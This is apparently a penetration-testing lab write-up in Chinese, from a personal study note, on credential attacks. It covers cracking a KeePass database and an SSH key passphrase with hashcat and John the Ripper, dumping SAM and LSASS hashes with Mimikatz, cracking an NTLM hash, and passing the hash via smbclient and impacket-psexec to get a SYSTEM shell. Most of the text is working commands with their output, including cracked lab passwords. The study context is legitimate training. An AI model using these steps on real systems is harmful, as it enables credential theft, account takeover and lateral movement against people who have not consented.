Pentest 中，假設已經獲得密碼管理器的 client 的存取權限，將提取密碼管理器的資料庫 (如下圖安裝 KeePass)，將檔案轉換為與 Hashcat 相容的格式，再破解主資料庫密碼\
![image](https://hackmd.io/_uploads/SyhWmXsKJe.png)

#### 1. 尋找 KeePass database 儲存的檔案： .kdbx file
遞迴尋找 `C:\` 路徑底下副檔名為 .kdbx 的檔案 
```
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```
> `Get-ChildItem`：指定路徑下的所有檔案與資料夾\
`-Path C:\`：目標路徑為整個 C:\ 
`-Include *.kdbx`：篩選副檔名為 .kdbx 的檔案\
`-File`：僅回傳檔案，不包含資料夾\
`-Recurse`：遞迴方式搜尋\
`-ErrorAction SilentlyContinue`：遇到權限不足、無法存取的資料夾時，不顯示 Error
>> 結果顯示: `C:\Users\jason\Documents`路徑下

![image](https://hackmd.io/_uploads/SyGQ87jtJx.png)

#### 2. 使用 Hash 爆破工具
- 將 rdp windows 上的 Database.kdbx 傳回 kali 進行爆破
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:jason /p:lab /v:192.168.209.203 /drive:myshare,/tmp
```
> 透過 xfreerdp 掛載 kali 本機資料夾\
> kali /tmp 對應到 windows /myshare\
> ![image](https://hackmd.io/_uploads/Hk6RsQoK1l.png)\
> 在 windows 上會看到 /myshare，將 Database.kdbx 丟到 /myshare，再從 kali /tmp 取出

>[!Note]
> JtR（John the Ripper）套件包含多種腳本轉換，例如 [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) 和 [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c)，可以將不同格式的檔案轉換為適合破解的雜湊格式

```
┌──(chw㉿CHW)-[~]
└─$ keepass2john Database.kdbx > keepass.hash       

┌──(chw㉿CHW)-[~]
└─$ cat keepass.hash  
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

```
> 正確 Hash format 不包含 "Database:"，刪除後就可以進行爆破\

- 查詢 Hash 類型 
[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) 上查詢符合以上 Hash 的類型\
![image](https://hackmd.io/_uploads/ryFG0Xst1g.png)
或用 hashcat --help 查看
```
┌──(chw㉿CHW)-[~]
└─$ hashcat --help | grep -i "KeePass"
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager

```
> correct mode: `13400`

- 開始爆破
使用 `rockyou.txt` password，與 hashcat 預設的密碼規則 `rockyou-30000.rule --force` 進行爆破
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.6) starting

...
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 430331550000
* Runtime...: 1 sec
..
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1

...
```
> qwertyuiop123!

#### 3. 開啟資料庫
開啟 Open Database ，並用密碼登入\
![image](https://hackmd.io/_uploads/HkGsgVjKyl.png)

開啟 KeePass 後，可以成功存取所有用戶密碼
![image](https://hackmd.io/_uploads/SyzWb4oKJg.png)

### SSH Private Key Passphrase
#### 1. 尋找 SSH Private Key
通常透過 Path Traversal 來讀檔\
這裡略過，直接從範例中下載 `id_rsa` 與`note.txt`
![image](https://hackmd.io/_uploads/Hkxai4oKJg.png)
```
CWei@CHW-MacBook-Pro ~ % cat note.txt 
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
CWei@CHW-MacBook-Pro ~ % cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBwWeeKjT
dk6h6IP831kv63AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDvrm3+hxV2
g3cmlbup2vX0C/+WHtXTKaJwamj6K3BLBxjBRk5g0HzH05tUb5qJZCo2sFNids+7BvO5NJ
89f9+1TSwh8KQvhzdMd1CXG6MFkx4Rpan27gFKHO45ml9Y/p5J8xvvmLOu5nwCWbBX1d8j
...
```
> note.txt 是 dave 的 password list (現實沒這麼友善)
> 👉🏻 嘗試用 password list 登入 SSH

```
CWei@CHW-MacBook-Pro ~ % chmod 600 id_rsa 
CWei@CHW-MacBook-Pro ~ % ssh -i id_rsa -p 2222 dave@192.168.209.201
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
..
```
> 使用 password list 都登入失敗

>[!Note]
> In a real penetration test we would keep these passwords on hand for various other vectors including spray attacks, or attacks against a dave user on other systems.

#### 2. 使用 Hash 爆破工具
- 將 id_rsa 轉換成 hash format

```
CWei@CHW-MacBook-Pro ssh2john % python3 ssh2john.py /Users/CWei/id_rsa > /Users/CWei/ssh.hash
CWei@CHW-MacBook-Pro ssh2john % cat /Users/CWei/ssh.hash 
/Users/CWei/id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010705
```
- 查詢 Hash 類型 
[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) 上查詢符合以上 Hash 的類型\
![image](https://hackmd.io/_uploads/ryywrSjYyx.png)
或用 hashcat --help 查看
```
CWei@CHW-MacBook-Pro ssh2john % hashcat -h | grep -i "ssh"
...
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
```
>  `$6$` is mode 22921

- 建立密碼規則
```
CWei@CHW-MacBook-Pro ~ % cat note.txt 
...
Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```
> 包含三個數字、一個大寫字母和一個特殊字元

Dave 在密碼中使用「137」三個數字。另外，「Window」密碼以大寫開頭。\
先嘗試使用規則函數將首字變成大寫。並將最常見的特殊字元 `！`, `@` 和 `#`，因為它是鍵盤左側前三個特殊字元。

撰寫規則
```
CWei@CHW-MacBook-Pro ~ % cat ssh.rule 
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

- 開始爆破
```
CWei@CHW-MacBook-Pro ~ % hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

...
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception

* Token length exception: 1/1 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

No hashes loaded.

...
```
>[!Warning]
>出現 Token length exception 錯誤:\
>參考 [Hashcat 論壇](https://hashcat.net/forum/thread-10662.html)。現代的 SSH 私鑰及對應的密碼通常使用 `AES-256-CTR` 加密，而 hashcat 的模式 22921 不支援這種加密方式。因此 hashcat 無法正確處理 hash。

但 John the Ripper (JtR) 也可以處理這種密碼。\
為了能夠在 JtR 使用先前建立的規則，我們需要將規則新增到    `/etc/john/john.conf` 中。\
[舉例] 使用「List.Rules」語法將該自訂規則命名 為sshRules。我們將使用 sudo 和 sh -c 將規則附加到 `/etc/john/john.conf` 中。\
(需要更改 config ，我把環境移回 Kali )
```                                        
┌──(chw㉿CHW)-[~]
└─$ cat ssh.rule                                   
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
[sudo] password for chw: 
```

將 sshRules 新增到 JtR 設定檔後，\
 `--wordlist=ssh.passwords` 定義先前建立的 wordlist\
`--rules=sshRules` 選擇先前建立的規則\
最後提供私鑰的 hash: `ssh.hash`
```
┌──(chw㉿CHW)-[~]
└─$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Created directory: /home/chw/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:01 DONE (2025-02-13 05:39) 0.7692g/s 13.84p/s 13.84c/s 13.84C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
> Umbrella137!

## Working with Password Hashes
在現實 PT 中， 可以透過 [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash) 或 [relay attacks](https://en.wikipedia.org/wiki/Relay_attack) 等攻擊，建立和攔截 Windows 網路驗證請求

>[!Important]
>- **[NTLM（NT LAN Manager)](https://en.wikipedia.org/wiki/NTLM)**:
>Windows 驗證協議，主要用來對用戶進行身份驗證。NTLM 使用 Challenge-Response 機制，並以 MD4 或 HMAC-MD5 來計算 Hash。
>- **[Net-NTLMv2（NTLM Challenge-Response Authentication)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)**:
>Windows 用於網路身份驗證的 Challenge-Response 機制，常見於 SMB、LDAP、HTTP 等協議。與 NTLM（本地儲存的 hash） 不同，Net-NTLMv2 主要用於網路傳輸中的身份驗證，因此更容易被攔截和攻擊。 ([Net-NTLMv1 參考](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5))

### NTLM vs. Net-NTLMv2
_ | NTLM | Net-NTLMv2 |
:------:|:---------------------|:---------------------|
用途| 本地儲存的 password hash | 網路驗證機制
儲存路徑 | `SAM` / `NTDS.dit` (Local) | 登入 Windows 服務時傳輸
Hash format | `Username`:`RID`:`LM Hash`:`NTLM Hash`::: | `User`::`Domain`:`ServerChallenge`:`NT Proof`:`ClientResponse`
Hash example | Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::|User::Domain:1122334455667788:8877665544332211AABBCCDDEEFF1122:0102030405060708090A0B0C0D0E0F1011121314151617181920212223242526
破解方式 | 彩虹表、暴力破解 | 中間人攻擊、離線破解

### Cracking NTLM
Windows 將使用者的 password hash 儲存在 [Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager) (SAM) 資料庫中，用於驗證本機或遠端使用者。

>[!Tip]
> Microsoft 在 Windows NT 4.0 SP3 引入 SYSKEY 來部分加密 SAM 檔案，防止離線密碼攻擊。Windows 會以 [LAN Manager](https://en.wikipedia.org/wiki/LAN_Manager)（LM） 或 NTLM 格式儲存密碼。
> - LM（基於 DES）：安全性弱，密碼不區分大小寫，最長 14 字元，超過 7 字元會分成兩段分別加密。
> - NTLM：較安全的 hash 格式，取代 LM。
>
>自 Windows Vista / Server 2008 起，LM 預設已禁用。

NTLM hashes 儲存在 SAM database ， 解決了 LM 的弱點，但是 NTLM hash 仍未加鹽。

>[!Note]
> [Salts](https://en.wikipedia.org/wiki/Salt_(cryptography)) 是在密碼雜湊前隨機加入值，為了防止 attacker 使用Rainbow Table 來反推密碼 (Rainbow Table Attack)。

在 Windows 中，使用者無法在 `C:\Windows\system32\config\sam` 任意複製、重新命名或移動 SAM database\
🥚 我們可以使用 [Mimikatz](https://github.com/gentilkiwi/mimikatz) tool 繞過這個限制

>[!Important]
> Mimikatz:\
> 主要用於提取 password, hashes, Kerberos tickets 與 privilege escalation.
> - Extracting plaintext passwords (from LSASS memory)
> - Dump NTLM/Net-NTLMv2 Hashes (for offline cracking or lateral movement)
> - Pass-the-Hash / Pass-the-Ticket attack (login to the target system without a password)
> - Kerberos ticket operations (Golden Ticket / Silver Ticket)
> - Privilege escalation (token stealing, SEDebug privileges)
>
> Mimikatz 的 `sekurlsa` 模組 可以從 LSASS（Local Security Authority Subsystem Service） process memory 中提取 password hashes。
>> [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) 是 Windows 內部一個安全流程，負責:
>> 1. user authentication 使用者身份驗證（處理登入時的密碼驗證）。
>> 2. password changes 密碼變更管理（確保密碼更新的安全性）。
>> 3. access token creation 存取權限建立（用於管理使用者權限）。

LSASS permissions and access requirements:
- SYSTEM privileges:
LSASS 運行時擁有 SYSTEM 等級的權限，這使得它比具有 Administrator 權限的 process 更強大。因此，要從 LSASS 提取密碼，必須具備相當高的權限。
- [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) 訪問權限:
只有在以 Administrator 身分（or higher）執行 Mimikatz 並 啟用SeDebugPrivilege 存取權限時，我們才能提取密碼。

也可以使用 [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) 或 Mimikatz 內建的 token elevation 功能，可以將我們的權限提升到 SYSTEM 帳號

以下範例：\
#### 1. 先使用 Get-LocalUser 確定系統本地存在哪些 user
```
PS C:\Windows\system32> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
sam                True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```
> 發現存在其他 user: nelly 和 sam
>> 目標是透過 retrieving and cracking NTLM hash 來取得 nelly 的文本密碼。

#### 2. Mimikatz 查看儲存的系統憑證
##### 2.1 開啟 mimikatz，檢查 SeDebugPrivilege 權限 (`privilege::debug`)
```
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK
```
> `Privilege '20' OK`: 表示當前用戶啟用了 SeDebugPrivilege

##### 2.2 提升到 SYSTEM 使用者權限 (`token::elevate`)
```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

660     {0;000003e7} 1 D 41854          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0027e219} 2 F 4062187     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4133393     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
> `User name :`: 空白，因為是 SYSTEM 帳戶\
> SYSTEM 帳戶資訊:\
> `NT AUTHORITY\SYSTEM`, `S-1-5-18`

##### 2.3 提取明文密碼和密碼雜湊
透過 Mimikatz 常用指令：
- `sekurlsa::logonpasswords`
透過掃描 Windows memory，列出目前登入系統的所有用戶帳號、密碼 hash 及其他認證資料，像是 Kerberos 票證、NTLM 哈希等。但會產生大量的輸出。
- `lsadump::sam`
需要有管理員或系統權限(所以上面先使用 `token::elevate` 提權)，這個 command 用來從系統中的 SAM 資料庫中提取本地帳戶的密碼 Hash。
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2613814 (00000000:0027e236)
Session           : RemoteInteractive from 2
User Name         : offsec
Domain            : MARKETINGWK01
Logon Server      : MARKETINGWK01
Logon Time        : 2/13/2025 11:33:29 PM
SID               : S-1-5-21-4264639230-2296035194-3358247000-1001
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : MARKETINGWK01
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : MARKETINGWK01
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : MARKETINGWK01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2613785 (00000000:0027e219)
Session           : RemoteInteractive from 2
User Name         : offsec
Domain            : MARKETINGWK01
Logon Server      : MARKETINGWK01
Logon Time        : 2/13/2025 11:33:29 PM
SID               : S-1-5-21-4264639230-2296035194-3358247000-1001
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : MARKETINGWK01
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : MARKETINGWK01
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : MARKETINGWK01
         * Password : (null)
        ssp :
        credman :
        cloudap :
...

mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000

SAMKey : 38e2cdfccc1d5220e001dd7d9b6186b3

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c17a032e0528525ad763c0bec3658226

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f39c5178d64eb4811f0e24caddc71880

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 98c4bca33a76248827ddb6d7f5af7e5cc31742eab603ef34944cc4055052bb28
      aes128_hmac       (4096) : f4f2779905636ac6d8a3dbcccd3da7ad
      des_cbc_md5       (4096) : fe76fd5291a4b0d0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : fe76fd5291a4b0d0


RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4afc51d3706e26bc98dc90db9a50826a

* Primary:Kerberos-Newer-Keys *
    Default Salt : MARKETINGWK01offsec
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 84ec02ea2dd7eb6df176b7abf418babc44e3b082a787ccebe386141eae88385e
      aes128_hmac       (4096) : 32d058faeea4ca20356399fcf099fcbd
      des_cbc_md5       (4096) : c8e60ecb689e1543
    OldCredentials
      aes256_hmac       (4096) : 8d6689fa7fb0321706ad1363167429077dcbfa1ad76e74f95ce2f58993c36eff
      aes128_hmac       (4096) : 0bdfdee532724ecdb9f09b62dca4e2be
      des_cbc_md5       (4096) : ab3b75862cc1c4b0
    OlderCredentials
      aes256_hmac       (4096) : 00df88a3ea2cc3bac58ea0ced5304301dbcdfb7c9440e3bba8fcaf07522a1902
      aes128_hmac       (4096) : e967183d09db853175ae40e7a57d72ae
      des_cbc_md5       (4096) : 9da4c20dad25046b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MARKETINGWK01offsec
    Credentials
      des_cbc_md5       : c8e60ecb689e1543
    OldCredentials
      des_cbc_md5       : ab3b75862cc1c4b0


RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5036485b9af540fede9a4d43ab6fdc26

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-6OLBM9Onelly
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
      des_cbc_md5       (4096) : 7fd6f702615e0e75
    OldCredentials
      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
      des_cbc_md5       (4096) : 7fd6f702615e0e75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-6OLBM9Onelly
    Credentials
      des_cbc_md5       : 7fd6f702615e0e75
    OldCredentials
      des_cbc_md5       : 7fd6f702615e0e75
...

mimikatz #
```
> 以上取得 nelly password hash 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10

#### 3. Hash 爆破
回到 Kali 進行 Hash 爆破
```
┌──(chw㉿CHW)-[~]
└─$ cat nelly.hash  
3ae8e5f0ffabb3a627672e1600f1ba10
 
┌──(chw㉿CHW)-[~]
└─$ hashcat --help | grep -i "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
> correct mode: 1000

```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
...

```
> nicole1

嘗試用 nelly:nicole1 登入 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:nelly /p:nicole1 /v:192.168.111.210
```
![image](https://hackmd.io/_uploads/B1YJiO3FJl.png)

### Passing NTLM
根據密碼強度， NTLM hash 爆破耗時也可能沒有結果。\
如何透過不破解來利用 NTLM 雜湊 👉🏻 `pass-the-hash (PtH)`

- pass-the-hash (PtH)
攻擊者可以使用有效的 username 和 NTLM password hash 來進行身份驗證，而不需要明文密碼。\
這是因為 NTLM/LM 密碼雜湊在 Windows 系統中是靜態的，並且不會在每次登錄會話中進行變化，也不會加鹽。這使得 attacker 能夠在目標機器之間，使用相同的雜湊來進行身份驗證，無論是本地還是遠程的目標系統。但必須有管理員權限。

如果不使用本地的 Administrator 用戶，那麼目標機器必須以特定方式配置才能成功執行，啟用 Windows Vista 後，所有 Windows 系統預設啟用了 [UAC remote restrictions](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)，阻止了軟體或指令以管理權限在遠端系統上執行。

#### 1. Mimikatz 查看儲存的系統憑證
範例架設有兩台 machines: VM1 (192.168.111.212)  & VM2 (192.168.111.211)\
已成功登入 VM1 `gunther:password123!`
在 VM1 上透過 File Explorer 使用 SMB share 存取 VM2: `\\192.168.111.212\secrets`
![image](https://hackmd.io/_uploads/S17T2Y2t1g.png)
> 輸入 user:gunther 無法存取
>> 代表 VM2 沒有這位使用者
>> 👉🏻 利用 Mimikatz 來取得管理員的 NTLM Hash

```
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
Domain : FILES01
SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
Local SID : S-1-5-21-1555802299-1328189896-734683769

SAMKey : 201b0e3078f2be635aaaa055ab5a7828

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b

...

RID  : 000003f0 (1008)
User : files02admin
  Hash NTLM: e78ca771aeb91ea70a6f1bb372c186b6
...

```
> 取得 Administrator NTLM hash

#### 2. SMB enumeration and management
為了使用 pass-the-hash (PtH)，需要使用支援 NTLM 雜湊進行驗證的工具:
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- scripts from the impacket library:  [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) & [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)

使用 smbclient 存取 VM2 secret/
```
┌──(chw㉿CHW)-[~]
└─$ smbclient \\\\192.168.111.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Fri Feb 14 04:17:11 2025
  secrets.txt                         A       16  Thu Sep  1 12:23:32 2022

                4554239 blocks of size 4096. 1601419 blocks available
smb: \> get secrets.txt
getting file \secrets.txt of size 16 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
> `雙反斜\\`: 用來轉義特殊字元\
> `--pw-nt-hash`: 傳遞 NTLM Hash

使用 NTLM Hash 成功存取 SMB share

#### 3. Obtain an interactive shell
這次使用 impacket 中的 psexec.py 腳本，可將執行檔上傳到 SMB share\
`-hashes`驗證格式為: `LMHash:NTHash`，但因為我們只使用 NTLM hash，可以用 32 個 0 填充 LMHash 部分。
```
┌──(chw㉿CHW)-[~]
└─$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.111.212
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.111.212.....
[*] Found writable share ADMIN$
[*] Uploading file fuurXoll.exe
[*] Opening SVCManager on 192.168.111.212.....
[*] Creating service LeqM on 192.168.111.212.....
[*] Starting service LeqM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7979:1856:9a4e:6c19%4
   IPv4 Address. . . . . . . . . . . : 192.168.111.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.111.254

C:\Windows\system32> whoami
nt authority\system

```
>[!Important]
